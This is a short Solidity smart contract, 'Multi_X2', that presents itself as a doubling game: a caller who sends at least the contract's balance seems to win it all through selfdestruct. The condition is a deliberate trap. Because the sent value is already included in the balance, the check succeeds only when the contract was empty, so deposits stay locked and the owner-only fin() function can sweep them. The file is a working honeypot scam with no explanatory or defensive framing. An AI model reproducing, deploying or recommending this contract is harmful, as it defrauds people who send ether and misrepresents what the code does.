1 pragma solidity ^0.4.25;
2 
3 contract Multi_X2
4 {
5     address Owner = msg.sender;
6 
7     function() public payable {}
8     function close() private { selfdestruct(msg.sender); }
9 
10     function X2() public payable {
11         if (msg.value >= address(this).balance) {
12            close();
13         }
14     }
15  
16     function fin() public {
17         if (msg.sender == Owner) {
18             close();
19         }
20     }
21 }